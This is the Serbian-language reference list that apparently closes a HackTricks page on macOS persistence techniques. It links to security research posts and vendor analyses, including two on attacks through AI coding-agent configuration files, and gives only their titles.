- [11] [Pored dobrih starih LaunchAgents - 2 - iTerm2 pokretanje](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Pored dobrih starih LaunchAgents - 7 - xbar plug-inovi](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Pored dobrih starih LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Pored dobrih starih LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Pored dobrih starih LaunchAgents - 3 - Stavke za prijavljivanje](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Pored dobrih starih LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Pored dobrih starih LaunchAgents - 24 - Akcije fascikli](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Akcije fascikli za perzistenciju na macOS-u (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Pored dobrih starih LaunchAgents - 27 - Dock prečice](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Pored dobrih starih LaunchAgents - 17 - Birači boja](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Pored dobrih starih LaunchAgents - 26 - Finder Sync plug-inovi](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Analiza perzistencije „Mac File Opener“-a (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Pored dobrih starih LaunchAgents - 16 - Čuvar ekrana](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Sačuvajte svoj pristup: čuvari ekrana za perzistenciju na macOS-u (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Pored dobrih starih LaunchAgents - 11 - Spotlight uvoznici](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Pored dobrih starih LaunchAgents - 9 - Panel sa podešavanjima](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Pored dobrih starih LaunchAgents - 19 - Periodične skripte](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Pored dobrih starih LaunchAgents - 5 - Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Pored dobrih starih LaunchAgents - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Trajna krađa akreditiva pomoću Authorization Plugins (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Pored dobrih starih LaunchAgents - 30 - Konfiguraciona datoteka man - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Pored dobrih starih LaunchAgents - 25 - Apache2 moduli](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Pored dobrih starih LaunchAgents - 31 - BSM okvir za reviziju](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Pored dobrih starih LaunchAgents - 23 - emond, Event Monitor Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Pored dobrih starih LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Pored dobrih starih LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [Pored dobrih starih LaunchAgents - 10 - Datoteke skripti aplikacija](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [Pored dobrih starih LaunchAgents - 32 - Dock Tile plug-inovi](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [Pored dobrih starih LaunchAgents - 33 - Vidžeti](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [Pored dobrih starih LaunchAgents - 34 - launchd zadaci pri pokretanju](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [Pored dobrih starih LaunchAgents - 35 - Perzistencija kroz NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [Korišćenje e-pošte za perzistenciju na OS X-u (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Sumnjiva izmena Apple Mail pravila u plist-u (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Zlonamerni profili - jedna od najozbiljnijih pretnji za Mac računare (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [Umetnost Mac malware-a, tom 1 - pogl. 0x2, perzistencija (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [Analiza CVE-2024-44243, zaobilaženja macOS SIP-a preko kernel ekstenzija (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [RCE i eksfiltracija API tokena kroz projektne datoteke Claude Code-a (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [Nova ranjivost u GitHub Copilot-u i Cursor-u - backdoor u datoteci sa pravilima (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome - Alternativni načini instalacije (spoljašnje ekstenzije)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Uklanjanje ExtensionInstallForcelist pravila u Chrome-u na Mac-u (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Pisanje Sudo plug-inova (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Daljinska eksploatacija Mac-a preko prilagođenih URL šema (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Dva trika za macOS perzistenciju zloupotrebom plug-inova (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [Minimalni primer CoreMediaIO DAL-a (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: analiza macOS TCC ranjivosti zasnovane na Spotlight-u (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Dokumentacija Python modula `site` (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
{{#include ../banners/hacktricks-training.md}}
